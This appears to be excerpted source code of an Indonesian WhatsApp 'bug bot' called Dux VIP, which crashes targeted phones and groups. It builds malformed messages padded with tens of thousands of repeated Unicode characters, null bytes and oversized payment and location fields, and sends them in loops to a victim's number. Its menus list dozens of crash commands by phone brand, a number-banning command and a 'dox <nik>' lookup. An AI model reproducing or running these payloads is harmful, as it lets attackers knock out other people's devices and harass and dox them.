...
" 𝐍𝐨",
" 𝐂𝐨𝐮𝐧𝐭𝐞𝐫",
"𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐮𝐱 𝐕𝐢𝐩 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫"
]
let { key } = await rxhl.sendMessage(from, {text: '𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝙳𝚄𝚇 𝘃𝟭𝟬...'})
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐃𝐮𝐱VIP🌷 ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐃𝐮𝐱 BUG WANGCAP ☠︎︎`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `𝐃𝐮𝐱 DOCUMENT 🌷`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝐃𝐮𝐱 AUTO CRASH!! 💥" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝐃𝐮𝐱 AUTO CRASH!! 💥', url : , merchant_url :  }"
            }],
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '𝐃𝐮𝐱BugVVIP', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐃𝐮𝐱 VIP DEV ☠︎︎`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@cyawwww?si=PjNR2Q9h18w-Q0X_`}}}, { quoted:m})} 
...
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗼𝘁 𝙵𝙴𝙰𝚃𝚄𝚁𝙴༆ ☠︎︎
➪➪• ${prefix}self (tdak bisa di pake orang lain) 
➪➪• ${prefix}public *(bisa di pakai orang lain)* 
➪➪• ${prefix}blok *234xxx* *(blockir nomor target)*
➪➪• ${prefix}unblok *234xx* *(buka nomor target)* 
➪➪• ${prefix}setppbot *(settingppbot)*
...
➪➪• ${prefix}soundmenu
➪➪• ${prefix}ownermenu
➪➪• ${prefix}stcker *(menu stiker)*
➪➪• ${prefix}download *(menu download)*
➪➪• ${prefix}tools 
➪➪• ${prefix}tiktokhot
➪➪• ${prefix}text_unbanned
➪➪• ${prefix}text_banned
➪➪• ${prefix}script
➪➪༆༆༆༆༆☠︎︎
⚠️ 
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vakgmqc9xVJY19QsiG2G\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vakgmqc9xVJY19QsiG2G\"}"
}
],
"messageParamsJson": ""
}
...
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗞𝗘𝗥𝗨𝗣𝗨𝗞༆ ☠︎︎
➪➪• ${prefix}crashtotal *+234xxx*
➪➪• ${prefix}crash_ui *+234xxx*
➪➪• ${prefix}spam-bug *+234xxx*
➪➪• ${prefix}bug_hard_spam *+234xxx*
➪➪• ${prefix}react_pc *+234xxx*
➪➪• ${prefix}autocrash_ios *+234xxx|Jumlah*
➪➪• ${prefix}audio_bug *+234xxx|Jumlah*
➪➪• ${prefix}bug_lokasi *+234xxx|Jumlah*
➪➪• ${prefix}kerupuk *+234xxx|Jumlah*
➪➪• ${prefix}lazada_sell *+234xxx|Jumlah*
➪➪• ${prefix}banned-nomor *+234xxx*
➪➪• ${prefix}bugvid1 *warning!!*
➪➪• ${prefix}bugvid2 *warning!!*
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗛𝗔𝗥𝗗 𝗚𝗥𝗢𝗨𝗣༆ ☠︎︎
➪➪• ${prefix}pesanan_paket *Id Grup*
➪➪• ${prefix}system-crash  *Id Grup*
➪➪• ${prefix}react_group  *Id Grup*
➪➪• ${prefix}basmi_sirkel *Id Grup|Jumlah*
➪➪• ${prefix}audio_bug_gc *Id Grup|Jumlah*
➪➪• ${prefix}lokasi_bug_gc *Id Grup|Jumlah*
➪➪• ${prefix}parah_bug_group *Id Grup|Jumlah*
...
➪➪• ${prefix}🦖  *+234xxx|Jumlah*
➪➪• ${prefix}🍉  *+234xxx|Jumlah*
➪➪• ${prefix}☠️  *+234xxx|Jumlah*
➪➪• ${prefix}💦  *+234xxx|Jumlah*
➪➪• ${prefix}🧀  *+234xxx|Jumlah*
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗕𝗨𝗚 𝗩𝗜𝗣༆ ☠︎︎
➪➪• ${prefix}gasken𝐃𝐮𝐱 *234xxx|Jumlah*
➪➪• ${prefix}otwcentang1 *234xxx|Jumlah*
➪➪• ${prefix}Dux_shoope *234xxx|Jumlah*
➪➪• ${prefix}Dux_ios *234xxx|Jumlah*
➪➪• ${prefix}Dux_andro *234xxx|Jumlah*
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨༆ ☠︎︎
➪➪• ${prefix}banned-nomor *234xxxx*
...
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗛𝗔𝗥𝗗 𝗩𝗜𝗣༆ ☠︎︎
➪➪• ${prefix}bantai-ip *+234xxx|Jumlah*
➪➪• ${prefix}ip-crash *+234xxx|Jumlah*
➪➪• ${prefix}samsung_kok_crash *+234xxx|Jumlah*
➪➪• ${prefix}bug_samsung *+234xxx|Jumlah*
➪➪• ${prefix}samsung_force *+234xxx|Jumlah*
➪➪• ${prefix}slayer07 *+234xxx|Jumlah*
➪➪• ${prefix}darkness *+234xxx|Jumlah*
➪➪• ${prefix}bug_kontak *+234xxx|Jumlah*
➪➪• ${prefix}virgam *+234xxx|Jumlah*
➪➪• ${prefix}brutal-ui *+234xxx|Jumlah*
➪➪• ${prefix}notif_aman? *+234xxx|Jumlah*
➪➪• ${prefix}brutal_bet_bangke *+234xxx|Jumlah*
➪➪• ${prefix}basmi_all_hp *+234xxx|Jumlah*
༆༆༆༆༆☠︎︎ 
༆= ☠︎︎𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗠𝗘𝗡𝗨༆ ☠︎︎
➪➪• ${prefix}getnik
➪➪• ${prefix}dox <nik>
...
➪➪• ${prefix}setppbot /full
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗛𝗔𝗥𝗗 𝗕𝗥𝗨𝗧𝗔𝗟༆ ☠︎︎
➪➪• ${prefix}nangis *+234xxx*
➪➪• ${prefix}kenapa_jir *+234xxx*
➪➪• ${prefix}auto-crash *+234xxx*
➪➪• ${prefix}penipu *+234xxx*
➪➪• ${prefix}panik_penipu *+234xxx*
➪➪• ${prefix}hitamkan_aja *+234xxx*
➪➪• ${prefix}oh *+234xxx*
➪➪• ${prefix}takutnya *+234xxx*
➪➪• ${prefix}gak_peduli *+234xxx*
➪➪• ${prefix}by_one_dek *+234xxx*
➪➪• ${prefix}ios_only_bug *+234xxx*
➪➪• ${prefix}samsung_only_bug *+234xxx*
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗘𝗔𝗦𝗦𝗬 𝗚𝗥𝗢𝗨𝗣༆ ☠︎︎
...
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗔𝗡𝗗𝗥𝗢/𝗜𝗢𝗦༆ ☠︎︎
➪➪• ${prefix}crash_asu *+234xxx*
➪➪• ${prefix}maaf *+234xxx*
➪➪• ${prefix}samsung-vip *+234xxx*
➪➪• ${prefix}oppo-vip *+234xxx*
➪➪• ${prefix}vivo-vip *+234xxx*
➪➪• ${prefix}xiaomi-vip *+234xxx*
➪➪• ${prefix}infinix-vip *+234xxx*
➪➪• ${prefix}tecno-vip *+234xxx*
➪➪• ${prefix}ampun_sepuh *+234xxx*
➪➪• ${prefix}jangan_sombong *+234xxx*
➪➪• ${prefix}yameteh *+234xxx*
➪➪• ${prefix}mantan *+234xxx*
➪➪• ${prefix}ip_reset_dek *+234xxx*
༆༆༆༆༆☠︎︎
༆= ☠︎︎𝗕𝗨𝗚 𝗘𝗠𝗢𝗝𝗜༆ ☠︎︎
➪➪• ${prefix}🍒 *+234xxx*
➪➪• ${prefix}🦕 *+234xxx*
...
➪➪• ${prefix}crashtotal *+234xxx*
➪➪• ${prefix}crash_ui *+234xxx*
➪➪• ${prefix}spam-bug *+234xxx* *warning!!*
➪➪• ${prefix}bug_hard_spam *+234xxx* *warning!!*
➪➪• ${prefix}react_pc *+234xxx*
➪➪• ${prefix}autocrash_ios *+234xxx|Jumlah*
➪➪• ${prefix}audio_bug *+234xxx|Jumlah*
➪➪• ${prefix}bug_lokasi *+234xxx|Jumlah*
...
rxhl.sendMessage(from, { caption: `𝐃𝐮𝐱 Official!`, video: { url: data.watermark }}, {quoted:m})
})}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `𝐃𝐮𝐱 Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `𝐃𝐮𝐱VIP🌷`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `𝐃𝐮𝐱VIP🌷`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `𝐃𝐮𝐱VIP🌷`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
...
case 'gasken𝐃𝐮𝐱': case 'otwcentang1': case 'Dux_shoope': case 'Dux_ios': case 'Dux_andro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
...
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vakgmqc9xVJY19QsiG2G`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
replyz(`Dux is an immortal xdxd 💀 *${Pe}*`)
break
...
body: proto.Message.InteractiveMessage.Body.create({
            text: '*Silahkan pilih bug menu dibawah ini kak ☠︎︎*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `𝐃𝐮𝐱-VIP`
          }),
